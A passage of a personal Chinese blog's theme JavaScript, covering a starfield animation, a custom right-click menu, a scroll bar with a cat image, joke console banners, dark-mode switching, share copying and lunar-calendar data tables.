")", h.arc(this.x, this.y, 1.5, 0, 2 * Math.PI, !1); for (var t = 0; t < 30; t++)h.fillStyle = "rgba(" + d + "," + (this.opacity - this.opacity / 20 * t) + ")", h.rect(this.x - this.dx / 4 * t, this.y - this.dy / 4 * t - 2, 2, 2), h.fill()      } else h.fillStyle = "rgba(" + r + "," + this.opacity + ")", h.rect(this.x, this.y, this.r, this.r);      h.closePath(), h.fill()    }, this.move = function () {      this.x += this.dx, this.y += this.dy, !1 === this.fadingOut && this.reset(), (this.x > n - n / 4 || this.y < 0) && (this.fadingOut = !0)    }, setTimeout(function () {      o = !1    }, 50)  }  function m(t) {    return Math.floor(1e3 * Math.random()) + 1 < 10 * t  }  function l(t, i) {    return Math.random() * (i - t) + t  }  f(), window.addEventListener("resize", f, !1), function () {    h = s.getContext("2d");    for (var t = 0; t < i; t++) c[t] = new y, c[t].reset();    u()  }(), function t() {    document.getElementsByTagName('html')[0].getAttribute('data-theme') == 'dark' && u(), window.requestAnimationFrame(t)  }()};dark()document.addEventListener('pjax:complete', function () {  if (document.getElementById('post-comment')) owoBig();});document.addEventListener('DOMContentLoaded', function () {  if (document.getElementById('post-comment')) owoBig();});function owoBig() {  let flag = 1,     owo_time = '',    m = 3;  let div = document.createElement('div'),    body = document.querySelector('body');  div.id = 'owo-big';  body.appendChild(div)  let observer = new MutationObserver(mutations => {    for (let i = 0; i < mutations.length; i++) {      let dom = mutations[i].addedNodes,        owo_body = '';      if (dom.length == 2 && dom[1].className == 'OwO-body') owo_body = dom[1];      // else if (dom.length == 1 && dom[0].className == 'tk-comment') owo_body = dom[0];      else continue;      if (document.body.clientWidth <= 768) owo_body.addEventListener('contextmenu', e => e.preventDefault());      owo_body.onmouseover = (e) => {        if (flag && e.target.tagName == 'IMG') {          flag = 0;          owo_time = setTimeout(() => {            let height = e.path[0].clientHeight * m,              width = e.path[0].clientWidth * m,              left = (e.x - e.offsetX) - (width - e.path[0].clientWidth) / 2,              top = e.y - e.offsetY;            if ((left + width) > body.clientWidth) left -= ((left + width) - body.clientWidth + 10);            if (left < 0) left = 10;             div.style.cssText = `display:flex; height:${height}px; width:${width}px; left:${left}px; top:${top}px;`;            div.innerHTML = `<img src="${e.target.src}">`          }, 300);        }      };      owo_body.onmouseout = () => { div.style.display = 'none', flag = 1, clearTimeout(owo_time); }    }  })  observer.observe(document.getElementById('post-comment'), { subtree: true, childList: true })}function randomPost() {  fetch('/baidusitemap.xml').then(res => res.text()).then(str => (new window.DOMParser()).parseFromString(str, "text/xml")).then(data => {    let ls = data.querySelectorAll('url loc');    while (true) {      let url = ls[Math.floor(Math.random() * ls.length)].innerHTML;      if (location.href == url) continue;      location.href = url;      return;    }  })}if (document.body.clientWidth > 992) {  function getBasicInfo() {    var ViewH = $(window).height();    var DocH = $("body")[0].scrollHeight;    var ScrollTop = $(window).scrollTop();    var S_V = DocH - ViewH;    var Band_H = ScrollTop / (DocH - ViewH) * 100;    return {      ViewH: ViewH,      DocH: DocH,      ScrollTop: ScrollTop,      Band_H: Band_H,      S_V: S_V    }  };  function show(basicInfo) {    if (basicInfo.ScrollTop > 0.001) {      $(".neko").css('display', 'block');    } else {      $(".neko").css('display', 'none');    }  }  (function ($) {    $.fn.nekoScroll = function (option) {      var defaultSetting = {        top: '0',        scroWidth: 6 + 'px',        z_index: 9999,        zoom: 0.9,        borderRadius: 5 + 'px',        right: 55.6 + 'px',        nekoImg: "https://bu.dusays.com/2022/07/20/62d812db74be9.png",        hoverMsg: "喵呜~",        color: "var(--theme-color)",        during: 500,        blog_body: "body",      };      var setting = $.extend(defaultSetting, option);      var getThis = this.prop("className") !== "" ? "." + this.prop("className") : this.prop("id") !== "" ? "#" +        this.prop("id") : this.prop("nodeName");      if ($(".neko").length == 0) {        this.after("<div class=\"neko\" id=" + setting.nekoname + " data-msg=\"" + setting.hoverMsg + "\"></div>");      }      let basicInfo = getBasicInfo();      $(getThis)        .css({          'position': 'fixed',          'width': setting.scroWidth,          'top': setting.top,          'height': basicInfo.Band_H * setting.zoom * basicInfo.ViewH * 0.01 + 'px',          'z-index': setting.z_index,          'background-color': setting.bgcolor,          "border-radius": setting.borderRadius,          'right': setting.right,          'background-image': 'url(' + setting.scImg + ')',          'background-image': '-webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.1) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.1) 50%, rgba(255, 255, 255, 0.1) 75%, transparent 75%, transparent)', 'border-radius': '2em',          'background-size': 'contain'        });      $("#" + setting.nekoname)        .css({          'position': 'fixed',          'top': basicInfo.Band_H * setting.zoom * basicInfo.ViewH * 0.01 - 50 + 'px',          'z-index': setting.z_index * 10,          'right': setting.right,          'background-image': 'url(' + setting.nekoImg + ')',        });      show(getBasicInfo());      $(window)        .scroll(function () {          let basicInfo = getBasicInfo();          show(basicInfo);          $(getThis)            .css({              'position': 'fixed',              'width': setting.scroWidth,              'top': setting.top,              'height': basicInfo.Band_H * setting.zoom * basicInfo.ViewH * 0.01 + 'px',              'z-index': setting.z_index,              'background-color': setting.bgcolor,              "border-radius": setting.borderRadius,              'right': setting.right,              'background-image': 'url(' + setting.scImg + ')',              'background-image': '-webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.1) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.1) 50%, rgba(255, 255, 255, 0.1) 75%, transparent 75%, transparent)', 'border-radius': '2em',              'background-size': 'contain'            });          $("#" + setting.nekoname)            .css({              'position': 'fixed',              'top': basicInfo.Band_H * setting.zoom * basicInfo.ViewH * 0.01 - 50 + 'px',              'z-index': setting.z_index * 10,              'right': setting.right,              'background-image': 'url(' + setting.nekoImg + ')',            });          if (basicInfo.ScrollTop == basicInfo.S_V) {            $("#" + setting.nekoname)              .addClass("showMsg")          } else {            $("#" + setting.nekoname)              .removeClass("showMsg");            $("#" + setting.nekoname)              .attr("data-msg", setting.hoverMsg);          }        });      this.click(function (e) {        btf.scrollToDest(0, 500)      });      $("#" + setting.nekoname)        .click(function () {          btf.scrollToDest(0, 500)        });      return this;    }  })(jQuery);  $(document).ready(function () {    $("#myscoll").nekoScroll({      bgcolor: 'rgb(0 0 0 / .5)',      borderRadius: '2em',      zoom: 0.9    }    );  })}function setMask() {  if (document.getElementsByClassName("rmMask")[0] != undefined)    return document.getElementsByClassName("rmMask")[0];  mask = document.createElement('div');  mask.className = "rmMask";  mask.style.width = window.innerWidth + 'px';  mask.style.height = window.innerHeight + 'px';  mask.style.background = '#fff';  mask.style.opacity = '.0';  mask.style.position = 'fixed';  mask.style.top = '0';  mask.style.left = '0';  mask.style.zIndex = 998;  document.body.appendChild(mask);  document.getElementById("rightMenu").style.zIndex = 19198;  return mask;}function insertAtCursor(myField, myValue) {  if (document.selection) {    myField.focus();    sel = document.selection.createRange();    sel.text = myValue;    sel.select();  }  else if (myField.selectionStart || myField.selectionStart == '0') {    var startPos = myField.selectionStart;    var endPos = myField.selectionEnd;    var restoreTop = myField.scrollTop;    myField.value = myField.value.substring(0, startPos) + myValue + myField.value.substring(endPos, myField.value.length);    if (restoreTop > 0) {      myField.scrollTop = restoreTop;    }    myField.focus();    myField.selectionStart = startPos + myValue.length;    myField.selectionEnd = startPos + myValue.length;  } else {    myField.value += myValue;    myField.focus();  }}let rmf = {};rmf.showRightMenu = function (isTrue, x = 0, y = 0) {  let $rightMenu = $('#rightMenu');  $rightMenu.css('top', x + 'px').css('left', y + 'px');  if (isTrue) {    $rightMenu.show();  } else {    $rightMenu.hide();  }}rmf.copyWordsLink = function () {  let url = window.location.href  let txa = document.createElement("textarea");  txa.value = url;  document.body.appendChild(txa)  txa.select();  document.execCommand("Copy");  document.body.removeChild(txa);}rmf.switchReadMode = function () {  const $body = document.body  $body.classList.add('read-mode')  const newEle = document.createElement('button')  newEle.type = 'button'  newEle.className = 'fas fa-sign-out-alt exit-readmode'  $body.appendChild(newEle)  function clickFn() {    $body.classList.remove('read-mode')    newEle.remove()    newEle.removeEventListener('click', clickFn)  }  newEle.addEventListener('click', clickFn)}rmf.copySelect = function () {  document.execCommand('Copy', false, null);}rmf.scrollToTop = function () {  document.getElementsByClassName("menus_items")[1].setAttribute("style", "");  document.getElementById("name-container").setAttribute("style", "display:none");  btf.scrollToDest(0, 500);}document.body.addEventListener('touchmove', function () {}, { passive: false });function popupMenu() {  window.oncontextmenu = function (event) {    // if (event.ctrlKey) return true;    if (mouseMode == "off") return true;    $('.rightMenu-group.hide').hide();    if (document.getSelection().toString()) {      $('#menu-text').show();    }    if (document.getElementById('post')) {      $('#menu-post').show();    } else {      if (document.getElementById('page')) {        $('#menu-post').show();      }    }    var el = window.document.body;    el = event.target;    var a = /^(?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&'\*\+,;=.]+$/    if (a.test(window.getSelection().toString()) && el.tagName != "A") {      $('#menu-too').show()    }    if (el.tagName == 'A') {      $('#menu-to').show()      rmf.open = function () {        if (el.href.indexOf("http://") == -1 && el.href.indexOf("https://") == -1 || el.href.indexOf("yisous.xyz") != -1) {          pjax.loadUrl(el.href)        }        else {          location.href = el.href        }      }      rmf.openWithNewTab = function () {        window.open(el.href);        // window.location.reload();      }      rmf.copyLink = function () {        let url = el.href        let txa = document.createElement("textarea");        txa.value = url;        document.body.appendChild(txa)        txa.select();        document.execCommand("Copy");        document.body.removeChild(txa);      }    } else if (el.tagName == 'IMG') {      $('#menu-img').show()      rmf.openWithNewTab = function () {        window.open(el.src);        // window.location.reload();      }      rmf.click = function () {        el.click()      }      rmf.copyLink = function () {        let url = el.src        let txa = document.createElement("textarea");        txa.value = url;        document.body.appendChild(txa)        txa.select();        document.execCommand("Copy");        document.body.removeChild(txa);      }      rmf.saveAs = function () {        var a = document.createElement('a');        var url = el.src;        var filename = url.split("/")[-1];        a.href = url;        a.download = filename;        a.click();        window.URL.revokeObjectURL(url);      }    } else if (el.tagName == "TEXTAREA" || el.tagName == "INPUT") {      $('#menu-paste').show();      rmf.paste = function () {        navigator.permissions          .query({            name: 'clipboard-read'          })          .then(result => {            if (result.state == 'granted' || result.state == 'prompt') {              navigator.clipboard.readText().then(text => {                console.log(text)                insertAtCursor(el, text)              })            } else {              Snackbar.show({                text: '请允许读取剪贴板！',                pos: 'top-center',                showAction: false,              })            }          })      }    }    let pageX = event.clientX + 10;    let pageY = event.clientY;    let rmWidth = $('#rightMenu').width();    let rmHeight = $('#rightMenu').height();    if (pageX + rmWidth > window.innerWidth) {      pageX -= rmWidth + 10;    }    if (pageY + rmHeight > window.innerHeight) {      pageY -= pageY + rmHeight - window.innerHeight;    }    mask = setMask();    $(".rightMenu-item").click(() => {      $('.rmMask').attr('style', 'display: none');    })    $(window).resize(() => {      rmf.showRightMenu(false);      $('.rmMask').attr('style', 'display: none');    })    mask.onclick = () => {      $('.rmMask').attr('style', 'display: none');    }    rmf.showRightMenu(true, pageY, pageX);    $('.rmMask').attr('style', 'display: flex');    return false;  };  window.addEventListener('click', function () {    rmf.showRightMenu(false);  });}if (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {  popupMenu()}const box = document.documentElementfunction addLongtabListener(target, callback) {  let timer = 0  target.ontouchstart = () => {    timer = 0     timer = setTimeout(() => {      callback();      timer = 0    }, 380)  }  target.ontouchmove = () => {    clearTimeout(timer)     timer = 0  }  target.ontouchend = () => {     if (timer) {      clearTimeout(timer)    }  }}addLongtabListener(box, popupMenu)rmf.fullScreen = function () {  if (document.fullscreenElement) document.exitFullscreen();  else document.documentElement.requestFullscreen();}if (localStorage.getItem("mouse") == undefined) {  localStorage.setItem("mouse", "on");}var mouseMode = localStorage.getItem("mouse");function changeMouseMode() {  if (localStorage.getItem("mouse") == "on") {    mouseMode = "off";    localStorage.setItem("mouse", "off");    debounce(function () {      new Vue({        data: function () {          this.$notify({            title: "切换右键模式成功🍔",            message: "当前鼠标右键已恢复为系统默认！",            position: 'top-left',            offset: 50,            showClose: true,            type: "success",            duration: 5000          });        }      })    }, 300);  } else {    mouseMode = "on";    localStorage.setItem("mouse", "on");    debounce(function () {      new Vue({        data: function () {          this.$notify({            title: "切换右键模式成功🍔",            message: "当前鼠标右键已更换为网站指定样式！",            position: 'top-left',            offset: 50,            showClose: true,            type: "success",            duration: 5000          });        }      })    }, 300);  }}var now1 = new Date();function createtime1() {  var grt = new Date("11/29/2024 00:00:00");  now1.setTime(now1.getTime() + 250);  var days = (now1 - grt) / 1000 / 60 / 60 / 24;  var dnum = Math.floor(days);  var ascll = [    `欢迎来到 梦~醒🥝の小家!`,    `Future is now 🍭🍭🍭`,    `        ███████  ██████  ███    ███  █████  ██      ██   ██  █████  ██    ██ ████████ ██      ██    ██ ████  ████ ██   ██ ██      ██   ██ ██   ██ ██    ██    ██    █████   ██    ██ ██ ████ ██ ███████ ██      ███████ ███████ ██    ██    ██    ██      ██    ██ ██  ██  ██ ██   ██ ██      ██   ██ ██   ██ ██    ██    ██    ██       ██████  ██      ██ ██   ██ ███████ ██   ██ ██   ██  ██████     ██                                                 `,    "小站已经苟活",    dnum,    "天啦!",    "©2024 By 梦~醒🥝",  ];  setTimeout(    console.log.bind(      console,      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,      "color:#39c5bb",      "",      "color:#39c5bb",      "color:#39c5bb",      "",      "color:#39c5bb",      ""    )  );}createtime1();function createtime2() {  var ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为「大聪明」`, `Photo captured: `, ` 🤪 `];  setTimeout(    console.log.bind(      console,      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}`,      "color:white; background-color:#10bcc0",      "",      "",      'background:url("https://unpkg.zhimg.com/anzhiyu-assets@latest/image/common/tinggge.gif") no-repeat;font-size:450%'    )  );  setTimeout(console.log.bind(console, "%c WELCOME %c 欢迎光临，大聪明", "color:white; background-color:#23c682", ""));  setTimeout(    console.warn.bind(      console,      "%c ⚡ Powered by 梦~醒🥝 %c 你正在访问 梦~醒🥝の小家",      "color:white; background-color:#f0ad4e",      ""    )  );  setTimeout(console.log.bind(console, "%c W23-12 %c 系统监测到你已打开控制台", "color:white; background-color:#4f90d9", ""));  setTimeout(    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中", "color:white; background-color:#d9534f", "")  );}createtime2();console.log = function () { };console.error = function () { };console.warn = function () { };function switchNightMode() {  document.querySelector('body').insertAdjacentHTML('beforeend', '<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"><div id="sun"></div><div id="moon"></div></div></div>'),    setTimeout(function () {      document.querySelector('body').classList.contains('DarkMode') ? (document.querySelector('body').classList.remove('DarkMode'), localStorage.setItem('isDark', '0'), document.getElementById('modeicon').setAttribute('xlink:href', '#icon-moon')) : (document.querySelector('body').classList.add('DarkMode'), localStorage.setItem('isDark', '1'), document.getElementById('modeicon').setAttribute('xlink:href', '#icon-sun')),        setTimeout(function () {          document.getElementsByClassName('Cuteen_DarkSky')[0].style.transition = 'opacity 3s';          document.getElementsByClassName('Cuteen_DarkSky')[0].style.opacity = '0';          setTimeout(function () {            document.getElementsByClassName('Cuteen_DarkSky')[0].remove();          }, 1e3);        }, 2e3)    })  const nowMode = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'light'  if (nowMode === 'light') {    document.getElementById("sun").style.opacity = "1";    document.getElementById("moon").style.opacity = "0";    setTimeout(function () {      document.getElementById("sun").style.opacity = "0";      document.getElementById("moon").style.opacity = "1";    }, 1000);    activateDarkMode()    saveToLocal.set('theme', 'dark', 2)    // GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.day_to_night)    document.getElementById('modeicon').setAttribute('xlink:href', '#icon-sun')    setTimeout(() => {      new Vue({        data: function () {          this.$notify({            title: "关灯啦🌙",            message: "当前已成功切换至夜间模式！",            position: 'top-left',            offset: 50,            showClose: true,            type: "success",            duration: 5000          });        }      })    }, 2000)  } else {    document.getElementById("sun").style.opacity = "0";    document.getElementById("moon").style.opacity = "1";    setTimeout(function () {      document.getElementById("sun").style.opacity = "1";      document.getElementById("moon").style.opacity = "0";    }, 1000);    activateLightMode()    saveToLocal.set('theme', 'light', 2)    document.querySelector('body').classList.add('DarkMode'), document.getElementById('modeicon').setAttribute('xlink:href', '#icon-moon')    setTimeout(() => {      new Vue({        data: function () {          this.$notify({            title: "开灯啦🌞",            message: "当前已成功切换至白天模式！",            position: 'top-left',            offset: 50,            showClose: true,            type: "success",            duration: 5000          });        }      })    }, 2000)  }  typeof utterancesTheme === 'function' && utterancesTheme()  typeof FB === 'object' && window.loadFBComment()  window.DISQUS && document.getElementById('disqus_thread').children.length && setTimeout(() => window.disqusReset(), 200)}function share_() {  let url = window.location.origin + window.location.pathname  try {    var title = document.title;    var subTitle = title.endsWith("| Fomalhaut🥝") ? title.substring(0, title.length - 14) : title;    navigator.clipboard.writeText('梦~醒🥝的站内分享\n标题：' + subTitle + '\n链接：' + url + '\n欢迎来访！🍭🍭🍭');    new Vue({      data: function () {        this.$notify({          title: "成功复制分享信息🎉",          message: "您现在可以通过粘贴直接跟小伙伴分享了！",          position: 'top-left',          offset: 50,          showClose: true,          type: "success",          duration: 5000        });        // return { visible: false }      }    })  } catch (err) {    console.error('复制失败！', err);  }  // new ClipboardJS(".share", { text: function () { return '标题：' + document.title + '\n链接：' + url } });  // btf.snackbarShow("本页链接已复制到剪切板，快去分享吧~")}function share() {  debounce(share_, 300);}var OriginTitile = document.title;var titleTime;document.addEventListener('visibilitychange', function () {  if (document.hidden) {    document.title = '👀跑哪里去了~';    clearTimeout(titleTime);  } else {    document.title = '🐖抓到你啦～';    titleTime = setTimeout(function () {      document.title = OriginTitile;    }, 2000);  }});/*** @1900-2100区间内的公历、农历互转* @charset UTF-8* @Author  jiangjiazhi* @公历转农历：calendar.solar2lunar(1987,11,01); //[you can ignore params of prefix 0]* @农历转公历：calendar.lunar2solar(1987,09,10); //[you can ignore params of prefix 0]*//*** 农历1900-2100的润大小信息表* @Array Of Property* @return Hex*/var lunarInfo = [0x04bd8, 0x04ae0, 0x0a570, 0x054d5, 0x0d260, 0x0d950, 0x16554, 0x056a0, 0x09ad0, 0x055d2,   0x04ae0, 0x0a5b6, 0x0a4d0, 0x0d250, 0x1d255, 0x0b540, 0x0d6a0, 0x0ada2, 0x095b0, 0x14977,   0x04970, 0x0a4b0, 0x0b4b5, 0x06a50, 0x06d40, 0x1ab54, 0x02b60, 0x09570, 0x052f2, 0x04970,   0x06566, 0x0d4a0, 0x0ea50, 0x06e95, 0x05ad0, 0x02b60, 0x186e3, 0x092e0, 0x1c8d7, 0x0c950,   0x0d4a0, 0x1d8a6, 0x0b550, 0x056a0, 0x1a5b4, 0x025d0, 0x092d0, 0x0d2b2, 0x0a950, 0x0b557,   0x06ca0, 0x0b550, 0x15355, 0x04da0, 0x0a5b0, 0x14573, 0x052b0, 0x0a9a8, 0x0e950, 0x06aa0,   0x0aea6, 0x0ab50, 0x04b60, 0x0aae4, 0x0a570, 0x05260, 0x0f263, 0x0d950, 0x05b57, 0x056a0,   0x096d0, 0x04dd5, 0x04ad0, 0x0a4d0, 0x0d4d4, 0x0d250, 0x0d558, 0x0b540, 0x0b6a0, 0x195a6,   0x095b0, 0x049b0, 0x0a974, 0x0a4b0, 0x0b27a, 0x06a50, 0x06d40, 0x0af46, 0x0ab60, 0x09570,   0x04af5, 0x04970, 0x064b0, 0x074a3, 0x0ea50, 0x06b58, 0x05ac0, 0x0ab60, 0x096d5, 0x092e0,   0x0c960, 0x0d954, 0x0d4a0, 0x0da50, 0x07552, 0x056a0, 0x0abb7, 0x025d0, 0x092d0, 0x0cab5,   0x0a950, 0x0b4a0, 0x0baa4, 0x0ad50, 0x055d9, 0x04ba0, 0x0a5b0, 0x15176, 0x052b0, 0x0a930,   0x07954, 0x06aa0, 0x0ad50, 0x05b52, 0x04b60, 0x0a6e6, 0x0a4e0, 0x0d260, 0x0ea65, 0x0d530,   0x05aa0, 0x076a3, 0x096d0, 0x04afb, 0x04ad0, 0x0a4d0, 0x1d0b6, 0x0d250, 0x0d520, 0x0dd45,   0x0b5a0, 0x056d0, 0x055b2, 0x049b0, 0x0a577, 0x0a4b0, 0x0aa50, 0x1b255, 0x06d20, 0x0ada0,   0x14b63, 0x09370, 0x049f8, 0x04970, 0x064b0, 0x168a6, 0x0ea50, 0x06b20, 0x1a6c4, 0x0aae0,   0x0a2e0, 0x0d2e3, 0x0c960, 0x0d557, 0x0d4a0, 0x0da50, 0x05d55, 0x056a0, 0x0a6d0, 0x055d4,   0x052d0, 0x0a9b8, 0x0a950, 0x0b4a0, 0x0b6a6, 0x0ad50, 0x055a0, 0x0aba4, 0x0a5b0, 0x052b0,   0x0b273, 0x06930, 0x07337, 0x06aa0, 0x0ad50, 0x14b55, 0x04b60, 0x0a570, 0x054e4, 0x0d160,   0x0e968, 0x0d520, 0x0daa0, 0x16aa6, 0x056d0, 0x04ae0, 0x0a9d4, 0x0a2d0, 0x0d150, 0x0f252,  0x0d520] var solarMonth = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]/*** 天干地支之天干速查表* @Array Of Property trans['甲','乙','丙','丁','戊','己','庚','辛','壬','癸']* @return Cn string*/var Gan = ['\u7532', '\u4e59', '\u4e19', '\u4e01', '\u620a', '\u5df1', '\u5e9a', '\u8f9b', '\u58ec', '\u7678']/*** 天干地支之地支速查表* @Array Of Property* @trans['子','丑','寅','卯','辰','巳','午','未','申','酉','戌','亥']* @return Cn string*/var Zhi = ['\u5b50', '\u4e11', '\u5bc5', '\u536f', '\u8fb0', '\u5df3', '\u5348', '\u672a', '\u7533', '\u9149', '\u620c', '\u4ea5']/*** 天干地支之地支速查表<=>生肖* @Array Of Property* @trans['鼠','牛','虎','兔','龙','蛇','马','羊','猴','鸡','狗','猪']* @return Cn string*/var Animals = ['\u9f20', '\u725b', '\u864e', '\u5154', '\u9f99', '\u86c7', '\u9a6c', '\u7f8a', '\u7334', '\u9e21', '\u72d7', '\u732a']/*** 24节气速查表* @Array Of Property* @trans['小寒','大寒','立春','雨水','惊蛰','春分','清明','谷雨','立夏','小满','芒种','夏至','小暑','大暑','立秋','处暑','白露','秋分','寒露','霜降','立冬','小雪','大雪','冬至']* @return Cn string*/var solarTerm = ['\u5c0f\u5bd2', '\u5927\u5bd2', '\u7acb\u6625', '\u96e8\u6c34', '\u60ca\u86f0', '\u6625\u5206', '\u6e05\u660e', '\u8c37\u96e8', '\u7acb\u590f', '\u5c0f\u6ee1', '\u8292\u79cd', '\u590f\u81f3', '\u5c0f\u6691', '\u5927\u6691', '\u7acb\u79cb', '\u5904\u6691', '\u767d\u9732', '\u79cb\u5206', '\u5bd2\u9732', '\u971c\u964d', '\u7acb\u51ac', '\u5c0f\u96ea', '\u5927\u96ea', '\u51ac\u81f3']/*** 1900-2100各年的24节气日期速查表* @Array Of Property* @return 0x string For splice*/var sTermInfo = ['9778397bd097c36b0b6fc9274c91aa', '97b6b97bd19801ec9210c965cc920e', '97bcf97c3598082c95f8c965cc920f',  '97bd0b06bdb0722c965ce1cfcc920f', 'b027097bd097c36b0b6fc9274c91aa', '97b6b97bd19801ec9210c965cc920e',  '97bcf97c359801ec95f8c965cc920f', '97bd0b06bdb0722c965ce1cfcc920f', 'b027097bd097c36b0b6fc9274c91aa',  '97b6b97bd19801ec9210c965cc920e', '97bcf97c359801ec95f8c965cc920f', '97bd0b06bdb0722c965ce1cfcc920f',  'b027097bd097c36b0b6fc9274c91aa', '9778397bd19801ec9210c965cc920e', '97b6b97bd19801ec95f8c965cc920f',  '97bd09801d98082c95f8e1cfcc920f', '97bd097bd097c36b0b6fc9210c8dc2', '9778397bd197c36c9210c9274c91aa',  '97b6b97bd19801ec95f8c965cc920e', '97bd09801d98082c95f8e1cfcc920f', '97bd097bd097c36b0b6fc9210c8dc2',  '9778397bd097c36c9210c9274c91aa', '97b6b97bd19801ec95f8c965cc920e', '97bcf97c3598082c95f8e1cfcc920f',  '97bd097bd097c36b0b6fc9210c8dc2', '9778397bd097c36c9210c9274c91aa', '97b6b97bd19801ec9210c965cc920e',  '97bcf97c3598082c95f8c965cc920f', '97bd097bd097c35b0b6fc920fb0722', '9778397bd097c36b0b6fc9274c91aa',  '97b6b97bd19801ec9210c965cc920e', '97bcf97c3598082c95f8c965cc920f', '97bd097bd097c35b0b6fc920fb0722',  '9778397bd097c36b0b6fc9274c91aa', '97b6b97bd19801ec9210c965cc920e', '97bcf97c359801ec95f8c965cc920f',  '97bd097bd097c35b0b6fc920fb0722', '9778397bd097c36b0b6fc9274c91aa', '97b6b97bd19801ec9210c965cc920e',  '97bcf97c359801ec95f8c965cc920f', '97bd097bd097c35b0b6fc920fb0722', '9778397bd097c36b0b6fc9274c91aa',  '97b6b97bd19801ec9210c965cc920e', '97bcf97c359801ec95f8c965cc920f', '97bd097bd07f595b0b6fc920fb0722',  '9778397bd097c36b0b6fc9210c8dc2', '9778397bd19801ec9210c9274c920e', '97b6b97bd19801ec95f8c965cc920f',  '97bd07f5307f595b0b0bc920fb0722', '7f0e397bd097c36b0b6fc9210c8dc2', '9778397bd097c36c9210c9274c920e',  '97b6b97bd19801ec95f8c965cc920f', '97bd07f5307f595b0b0bc920fb0722', '7f0e397bd097c36b0b6fc9210c8dc2',  '9778397bd097c36c9210c9274c91aa', '97b6b97bd19801ec9210c965cc920e', '97bd07f1487f595b0b0bc920fb0722',  '7f0e397bd097c36b0b6fc9210c8dc2', '9778397bd097c36b0b6fc9274c91aa', '97b6b97bd19801ec9210c965cc920e',  '97bcf7f1487f595b0b0bb0b6fb0722', '7f0e397bd097c35b0b6fc920fb0722', '9778397bd097c36b0b6fc9274c91aa',  '97b6b97bd19801ec9210c965cc920e', '97bcf7f1487f595b0b0bb0b6fb0722', '7f0e397bd097c35b0b6fc920fb0722',  '9778397bd097c36b0b6fc9274c91aa', '97b6b97bd19801ec9210c965cc920e', '97bcf7f1487f531b0b0bb0b6fb0722',  '7f0e397bd097c35b0b6fc920fb0722', '9778397bd097c36b0b6fc9274c91aa', '97b6b97bd19801ec9210c965cc920e',  '97bcf7f1487f531b0b0bb0b6fb0722', '7f0e397bd07f595b0b6fc920fb0722', '9778397bd097c36b0b6fc9274c91aa',  '97b6b97bd19801ec9210c9274c920e', '97bcf7f0e47f531b0b0bb0b6fb0722', '7f0e397bd07f595b0b0bc920fb0722',  '9778397bd097c36b0b6fc9210c91aa', '97b6b97bd197c36c9210c9274c920e', '97bcf7f0e47f531b0b0bb0b6fb0722',  '7f0e397bd07f595b0b0bc920fb0722', '9778397bd097c36b0b6fc9210c8dc2', '9778397bd097c36c9210c9274c920e',  '97b6b7f0e47f531b0723b0b6fb0722', '7f0e37f5307f595b0b0bc920fb0722', '7f0e397bd097c36b0b6fc9210c8dc2',  '9778397bd097c36b0b70c9274c91aa', '97b6b7f0e47f531b0723b0b6fb0721', '7f0e37f1487f595b0b0bb0b6fb0722',  '7f0e397bd097c35b0b6fc9210c8dc2', '9778397bd097c36b0b6fc9274c91aa', '97b6b7f0e47f531b0723b0b6fb0721',  '7f0e27f1487f595b0b0bb0b6fb0722', '7f0e397bd097c35b0b6fc920fb0722', '9778397bd097c36b0b6fc9274c91aa',  '97b6b7f0e47f531b0723b0b6fb0721', '7f0e27f1487f531b0b0bb0b6fb0722', '7f0e397bd097c35b0b6fc920fb0722',  '9778397bd097c36b0b6fc9274c91aa', '97b6b7f0e47f531b0723b0b6fb0721', '7f0e27f1487f531b0b0bb0b6fb0722',  '7f0e397bd097c35b0b6fc920fb0722', '9778397bd097c36b0b6fc9274c91aa', '97b6b7f0e47f531b0723b0b6fb0721',  '7f0e27f1487f531b0b0bb0b6fb0722', '7f0e397bd07f595b0b0bc920fb0722', '9778397bd097c36b0b6fc9274c91aa',  '97b6b7f0e47f531b0723b0787b0721', '7f0e27f0e47f531b0b0bb0b6fb0722', '7f0e397bd07f595b0b0bc920fb0722',  '9778397bd097c36b0b6fc9210c91aa', '97b6b7f0e47f149b0723b0787b0721', '7f0e27f0e47f531b0723b0b6fb0722',  '7f0e397bd07f595b0b0bc920fb0722', '9778397bd097c36b0b6fc9210c8dc2', '977837f0e37f149b0723b0787b0721',  '7f07e7f0e47f531b0723b0b6fb0722', '7f0e37f5307f595b0b0bc920fb0722', '7f0e397bd097c35b0b6fc9210c8dc2',  '977837f0e37f14998082b0787b0721', '7f07e7f0e47f531b0723b0b6fb0721', '7f0e37f1487f595b0b0bb0b6fb0722',  '7f0e397bd097c35b0b6fc9210c8dc2', '977837f0e37f14998082b0787b06bd', '7f07e7f0e47f531b0723b0b6fb0721',  '7f0e27f1487f531b0b0bb0b6fb0722', '7f0e397bd097c35b0b6fc920fb0722', '977837f0e37f14998082b0787b06bd',  '7f07e7f0e47f531b0723b0b6fb0721', '7f0e27f1487f531b0b0bb0b6fb0722', '7f0e397bd097c35b0b6fc920fb0722',  '977837f0e37f14998082b0787b06bd', '7f07e7f0e47f531b0723b0b6fb0721', '7f0e27f1487f531b0b0bb0b6fb0722',  '7f0e397bd07f595b0b0bc920fb0722', '977837f0e37f14998082b0787b06bd', '7f07e7f0e47f531b0723b0b6fb0721',  '7f0e27f1487f531b0b0bb0b6fb0722', '7f0e397bd07f595b0b0bc920fb0722', '977837f0e37f14998082b0787b06bd',  '7f07e7f0e47f149b0723b0787b0721', 